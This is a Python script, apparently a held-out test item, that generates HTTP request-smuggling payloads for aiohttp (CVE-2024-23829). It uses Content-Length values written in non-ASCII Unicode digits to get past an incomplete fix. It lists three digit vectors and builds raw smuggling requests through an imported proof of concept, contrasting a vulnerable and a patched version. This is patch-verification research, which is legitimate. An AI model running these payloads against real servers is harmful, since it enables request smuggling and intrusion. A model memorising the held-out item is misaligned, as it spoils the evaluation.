#!/usr/bin/env python3
"""[HELD-OUT] CVE-2024-23829 residual exploit -- the incomplete fix in CVE-2023-47627.

CVE-2023-47627 replaced `int(length_hdr)` with `length_hdr.strip(" \\t").isdecimal()`.
But str.isdecimal() returns True for ANY Unicode decimal digit, and int() then parses
it -- so a Content-Length written with non-ASCII decimal digits (e.g. Arabic-Indic
U+0660..U+0669, or Fullwidth U+FF10..U+FF19) is still accepted on V1. That obfuscated
Content-Length re-enables the exact same smuggle the seed used, bypassing the guard.

  V1 aiohttp 3.8.6: "٠".isdecimal()==True, int("٠")==0 -> accepted -> FLAG (residual reaches).
  V2 aiohttp 3.9.2: DIGITS=re.compile(r"\\d+", re.ASCII); fullmatch("٠") is None
        -> 400+close -> BLOCKED (residual closed).

Header values are decoded utf-8 (`bvalue.decode("utf-8","surrogateescape")`) by the
parser, so the Content-Length value bytes are the UTF-8 encoding of the digit(s).
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from original_poc import build_smuggle  # noqa: E402

# Each vector encodes a Content-Length of value 0 using non-ASCII decimal digits that
# pass str.isdecimal() (V1) but fail DIGITS=re.compile(r"\d+", re.ASCII) (V2).
VECTORS = [
    ("cve-2024-23829-arabic-indic-zero", "٠"),      # ٠  U+0660
    ("cve-2024-23829-fullwidth-zero", "０"),          # ０  U+FF10
    ("cve-2024-23829-devanagari-zero", "०"),         # ०  U+0966
]


def candidate(vec=None) -> dict:
    vid, digit = vec if vec is not None else VECTORS[0]
    return {"id": vid, "raw": build_smuggle(digit.encode("utf-8"))}


if __name__ == "__main__":
    for v in VECTORS:
        c = candidate(v)
        print(c["id"], repr(c["raw"]))
